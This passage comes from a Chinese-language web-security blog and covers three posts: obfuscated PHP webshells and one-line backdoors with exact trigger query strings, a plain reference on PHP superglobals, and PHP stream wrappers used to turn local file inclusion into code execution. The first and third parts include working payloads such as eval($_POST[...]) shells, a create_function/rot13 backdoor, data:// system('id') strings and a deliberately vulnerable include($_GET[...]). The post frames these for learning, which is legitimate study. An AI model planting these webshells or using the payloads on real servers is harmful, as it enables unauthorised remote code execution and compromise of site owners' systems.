<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$dI3h=$&#123;<span class="string">'_REQUEST'</span>&#125;; <span class="keyword">if</span> (!<span class="keyword">empty</span>($dI3h[<span class="string">'PBbs'</span>])) &#123;     $lwA = $dI3h[<span class="string">'UpB_'</span>];    $SdlT=$dI3h[<span class="string">'PBbs'</span>]($lwA($dI3h[<span class="string">'PWWk'</span>]),$lwA($dI3h[<span class="string">'xfrwA'</span>]));    $SdlT($lwA($dI3h[<span class="string">'Epd'</span>]));   &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">知识点：</div><div class="line">$&#123;<span class="string">'xxx'</span>&#125;,其实代表的就是$xxx，其指代的是一个变量</div><div class="line">上面的构造有很多种，但是最容易发现的就是create_function</div><div class="line"></div><div class="line">使用：</div><div class="line">?PBbs=create_function&amp;UpB_=str_rot13&amp;PWWk=$a&amp;xfrwA=riny($a);&amp;Epd=flfgrz(yf);</div><div class="line">每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。</div><div class="line">  </div><div class="line">其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper</div><div class="line">?PBbs=create_function&amp;UpB_=trim&amp;PWWk=$n&amp;xfrwA=<span class="keyword">eval</span>($n);&amp;Epd=system(ls);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### php一句话</span></div><div class="line"></div><div class="line">* <span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>); <span class="meta">?&gt;</span></div><div class="line">　 <span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">　 &lt;O&gt;h=@<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div><div class="line">* &lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[sb])&lt;/script&gt;</div><div class="line">* $filename=$_GET[<span class="string">'xbid'</span>];</div><div class="line">   <span class="keyword">include</span> ($filename);</div><div class="line">* <span class="meta">&lt;?php</span> $c=<span class="string">'ass'</span>.<span class="string">'ert'</span>;$&#123;c&#125;($_POST[<span class="number">4</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> $k = str_replace(<span class="string">"8"</span>,<span class="string">""</span>,<span class="string">"a8s88s8e8r88t"</span>);$k($_POST[<span class="string">"8"</span>]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/27/php全局变量/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/27/php全局变量/" itemprop="url">php全局变量</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-27T23:35:21+08:00">
                2017-08-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="php全局变量"><a href="#php全局变量" class="headerlink" title="php全局变量"></a>php全局变量</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$\_REQUEST"></a>$\_REQUEST</h4><p>$\_REQUEST 收集GET或者POST数据，如果GET和POST同时有数据，则优先取POST数据。使用超级全局变量 $_REQUEST 来收集 input 标签的值。此例是使用本文件处理表单！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</div><div class="line">Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</div><div class="line">&lt;input type=&quot;submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php </div><div class="line">$name = $_REQUEST[&apos;fname&apos;]; </div><div class="line">echo $name; </div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="POST"><a href="#POST" class="headerlink" title="$\_POST"></a>$\_POST</h4><p>$\_POST  广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。</p>
<h4 id="GET"><a href="#GET" class="headerlink" title="$\_GET"></a>$\_GET</h4><p>$_GET   可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据。也可以收集 URL 中的发送的数据。</p>
<h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$\_COOKIE"></a>$\_COOKIE</h4><p>$\_COOKIE    用于取回 cookie 的值。</p>
<h4 id="SESSION"><a href="#SESSION" class="headerlink" title="$\_SESSION"></a>$\_SESSION</h4><p>$\_SESSION   存储和取回 session 变量</p>
<p>session中的变量不能通过请求来传递，但是可以响应时通过PHP处理函数进行赋值，而且如果想全局使用，必须加上session_start();</p>
<h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h4><p>$GLOBALS 引用全局作用域中可用的全部变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$x = 75; </div><div class="line">$y = 25;</div><div class="line"> </div><div class="line">function addition() &#123; </div><div class="line">  $GLOBALS[&apos;z&apos;] = $GLOBALS[&apos;x&apos;] + $GLOBALS[&apos;y&apos;]; </div><div class="line">&#125;</div><div class="line"> </div><div class="line">addition(); </div><div class="line">echo $z; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$\_SERVER"></a>$\_SERVER</h4><p>$_SERVER 保存关于报头、路径和脚本位置的信息</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER[&#39;PHP_SELF&#39;]</td>
<td>返回当前执行脚本的文件名。<br><a href="http://example.com/test.php/foo.bar" target="_blank" rel="external">http://example.com/test.php/foo.bar</a> 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /test.php/foo.bar</td>
</tr>
<tr>
<td>$_SERVER[&#39;argv&#39;]</td>
<td>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</td>
</tr>
<tr>
<td>$_SERVER[&#39;argc&#39;]</td>
<td>包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;GATEWAY_INTERFACE&#39;]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADDR&#39;]</td>
<td>返回当前运行脚本<font color="#f00">所在的服务器的 IP 地址。</font></td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_NAME&#39;]</td>
<td>返回当前运行脚本所在的服务器的主机名（比如 <a href="http://www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。" target="_blank" rel="external">www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</a><br><strong>Note</strong>: 在 Apache 2 里，必须设置 <em>UseCanonicalName = On</em> 和 <em>ServerName</em>。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SOFTWARE&#39;]</td>
<td>返回服务器标识字符串,在响应请求时的头信息中给出（比如 Apache/2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PROTOCOL&#39;]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_METHOD&#39;]</td>
<td>返回访问页面使用的请求方法（例如 POST/HEAD/PUT/GET）。<br><strong>Note</strong>:如果请求方法为 <em>HEAD</em>，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME&#39;]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。&gt;5.1.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME_FLOAT&#39;]</td>
<td>返回请求开始时的时间戳，微秒级别的精准度。&gt;5.4.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</td>
<td>当前运行脚本所在的文档根目录。在服务器配置文件中定义。</td>
</tr>
<tr>
<td>$_SERVER[&#39;QUERY_STRING&#39;]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT&#39;]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]</td>
<td>返回来自当前请求的 Accept-Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</td>
<td>当前请求头中 Accept-Language: 项的内容，如果存在的话。例如：“en”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]</td>
<td>当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CONNECTION&#39;]</td>
<td>当前请求头中 Connection: 项的内容，如果存在的话。例如：“Keep-Alive”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_HOST&#39;]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_REFERER&#39;]</td>
<td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</td>
<td>当前请求头中 User-Agent: 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 get_browser() 来使用该值，从而定制页面输出以便适应用户代理的性能。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTPS&#39;]</td>
<td>是否通过安全 HTTP 协议查询脚本。<br><strong>Note</strong>: 注意当使用 IIS 上的 ISAPI 方式时，如果不是通过 HTTPS 协议被访问，这个值将为 <em>off</em>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_VIA&#39;]</td>
<td>返回Via中的代理服务器IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</td>
<td>返回Client-IP中的客户端IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_ADDR&#39;]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</td>
<td>返回X-Forwarded-For内容</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_HOST&#39;]</td>
<td>返回浏览当前页面的用户的主机名。<br><strong>Note</strong>: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 <em>HostnameLookups On</em> 来产生它。参见 <a href="http://php.net/manual/zh/function.gethostbyaddr.php" target="_blank" rel="external">gethostbyaddr()</a>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_PORT&#39;]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_USER&#39;]</td>
<td>经验证的用户</td>
</tr>
<tr>
<td>$_SERVER[&#39;REDIRECT_REMOTE_USER&#39;]</td>
<td>验证的用户，如果请求已在内部重定向。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</td>
<td>返回当前执行脚本的绝对路径。<br><strong>Note</strong>:如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#39;SCRIPT_FILENAME&#39;] 将包含用户指定的相对路径。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADMIN&#39;]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PORT&#39;]</td>
<td>Web 服务器使用的端口。默认值为 “<em>80</em>”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。<br><strong>Note</strong>: 在 Apache 2 里，为了获取真实物理端口，必须设置 <em>UseCanonicalName = On</em> 以及 <em>UseCanonicalPhysicalPort = On</em>。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SIGNATURE&#39;]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[&#39;PATH_TRANSLATED&#39;]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。<br><strong>Note</strong>: 自 PHP 4.3.2 起，PATH_TRANSLATED 在 Apache 2 SAPI 模式下不再和 Apache 1 一样隐含赋值，而是若 Apache 不生成此值，PHP 便自己生成并将其值放入 SCRIPT_FILENAME 服务器常量中。这个修改遵守了 CGI 规范，PATH_TRANSLATED 仅在 PATH_INFO 被定义的条件下才存在。 Apache 2 用户可以在 httpd.conf 中设置 <em>AcceptPathInfo = On</em> 来定义 PATH_INFO。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_NAME&#39;]</td>
<td>返回当前脚本的路径</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_URI&#39;]</td>
<td>返回当前页面的 URI。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]</td>
<td>返回Upgrade-Insecure-Requests中的数据</td>
</tr>
<tr>
<td>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]</td>
<td>返回Cache-Control中的数据</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_DIGEST&#39;</td>
<td>当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_USER&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_PW&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</td>
</tr>
<tr>
<td>&#39;AUTH_TYPE&#39;</td>
<td>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</td>
</tr>
<tr>
<td>&#39;PATH_INFO&#39;</td>
<td>包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar" target="_blank" rel="external">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> 被访问，那么 $_SERVER[&#39;PATH_INFO&#39;] 将包含 /some/stuff。</td>
</tr>
<tr>
<td>&#39;ORIG_PATH_INFO&#39;</td>
<td>在被 PHP 处理之前，“PATH_INFO” 的原始版本。</td>
</tr>
</tbody>
</table>
<h4 id="FILES"><a href="#FILES" class="headerlink" title="$\_FILES"></a>$\_FILES</h4><p>$_FILES 可以从客户计算机向远程服务器上传文件。<br>    第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;, &quot;type&quot;, &quot;size&quot;, &quot;tmp_name&quot; 或 &quot;error&quot;<br>    例子：<br>        $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称<br>        $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型<br>        $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计<br>        $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称<br>        $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="$\_ENV"></a>$\_ENV</h4><p>$_ENV   通过环境方式传递给当前脚本的变量的数组。</p>
<p>这些变量被从 PHP 解析器的运行环境导入到 PHP 的全局命名空间。很多是由支持 PHP 运行的 Shell 提供的，并且不同的系统很可能运行着不同种类的 Shell，所以不可能有一份确定的列表。请查看你的 Shell 文档来获取定义的环境变量列表。<br>其他环境变量包含了 CGI 变量，而不管 PHP 是以服务器模块还是 CGI 处理器的方式运行。</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_ENV[&quot;ALLUSERSPROFILE&quot;]</td>
<td>C:\Documents and Settings\All Users</td>
</tr>
<tr>
<td>$_ENV[&quot;ClusterLog&quot;]</td>
<td>C:\WINDOWS\Cluster\cluster.log</td>
</tr>
<tr>
<td>$_ENV[&quot;CommonProgramFiles&quot;]</td>
<td>C:\Program Files\Common Files</td>
</tr>
<tr>
<td>$_ENV[&quot;COMPUTERNAME&quot;]</td>
<td>LIUBO</td>
</tr>
<tr>
<td>$_ENV[&quot;ComSpec&quot;]</td>
<td>C:\WINDOWS\system32\cmd.exe</td>
</tr>
<tr>
<td>$_ENV[&quot;FP_NO_HOST_CHECK&quot;]</td>
<td>NO</td>
</tr>
<tr>
<td>$_ENV[&quot;NUMBER_OF_PROCESSORS&quot;]</td>
<td>1</td>
</tr>
<tr>
<td>$_ENV[&quot;OS&quot;]</td>
<td>Windows_NT</td>
</tr>
<tr>
<td>$_ENV[&quot;Path&quot;]</td>
<td>C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;E:\Program Files\MySQL\MySQL Server 5.0\bin;c:\php;c:\php\ext</td>
</tr>
<tr>
<td>$_ENV[&quot;PATHEXT&quot;]</td>
<td>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_ARCHITECTURE&quot;]</td>
<td>x86</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_IDENTIFIER&quot;]</td>
<td>x86 Family 15 Model 4 Stepping 1, GenuineIntel</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_LEVEL&quot;]</td>
<td>15</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_REVISION&quot;]</td>
<td>0401</td>
</tr>
<tr>
<td>$_ENV[&quot;ProgramFiles&quot;]</td>
<td>C:\Program Files</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemDrive&quot;]</td>
<td>C:</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemRoot&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
<tr>
<td>$_ENV[&quot;TEMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;TMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;USERPROFILE&quot;]</td>
<td>C:\Documents and Settings\Default User</td>
</tr>
<tr>
<td>$_ENV[&quot;windir&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/27/php伪协议/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/27/php伪协议/" itemprop="url">php伪协议</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-27T00:37:29+08:00">
                2017-08-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文参考的是 Hello_C的php伪协议这篇文章，内容大部分时粘贴过来的。当然也参考了先知上的文章：<a href="https://xianzhi.aliyun.com/forum/mobile/read/795.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/795.html</a>——如何优雅的把lfi转化为rce（2017-02-27更新版）。当然，先知上的文章有点问题，因为web用户可能没有那么高的权限去访问log文件或者打开allow_url_include设置。</p>
<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
<thead>
<tr>
<th>包装或协议</th>
<th>控制能力</th>
<th>allow_url_include</th>
<th>漏洞类型</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>-</td>
<td>Off</td>
<td>LFI /文件操作</td>
<td></td>
</tr>
<tr>
<td>glob://</td>
<td>-</td>
<td>Off</td>
<td>目录遍历</td>
<td></td>
</tr>
<tr>
<td>php://filter/read</td>
<td>include</td>
<td>Off</td>
<td>文件泄露</td>
<td>PHP：//filter/read=convert.base64-encode/resource=index.php</td>
</tr>
<tr>
<td>php://filter/write</td>
<td>file_put_contents</td>
<td>Off</td>
<td>编码</td>
<td>file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
</tr>
<tr>
<td>php://input</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
</tr>
<tr>
<td>data://</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
</tr>
<tr>
<td>zip://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td></td>
</tr>
<tr>
<td>phar://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td>PHP版本&gt; = 5.3</td>
</tr>
</tbody>
</table>
<p>php中支持的伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">file:// — 访问本地文件系统</div><div class="line">http:// — 访问 HTTP(s) 网址</div><div class="line">ftp:// — 访问 FTP(s) URLs</div><div class="line">php:// — 访问各个输入/输出流（I/O streams）</div><div class="line">zlib:// — 压缩流</div><div class="line">data:// — 数据（RFC 2397）</div><div class="line">glob:// — 查找匹配的文件路径模式</div><div class="line">phar:// — PHP 归档</div><div class="line">ssh2:// — Secure Shell 2</div><div class="line">rar:// — RAR</div><div class="line">ogg:// — 音频流</div><div class="line">expect:// — 处理交互式的流</div></pre></td></tr></table></figure>
<p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
<ul>
<li><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php://stdin"></a>php://stdin</h4><p>主要用于php cli的输入</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><a href="/images/2017-07-28/f0b778051856c477.jpg"><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php://stdout"></a>php://stdout</h4><p>主要用于php cli的输入<code>&lt;?php  $fh = fopen(&#39;php://stdout&#39;, &#39;w&#39;);  fwrite($fh, &quot;标准输出php://stdout\n&quot;);  fclose($fh);  fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/e62036bab64c514b.jpg"><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以读取到post没有解析的原始数据<code>&lt;?php   echo file_get_contents($_GET[&quot;a&quot;]);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/caba05f9460d9dbe.jpg"><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt="img"></a><br>当php代码换成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
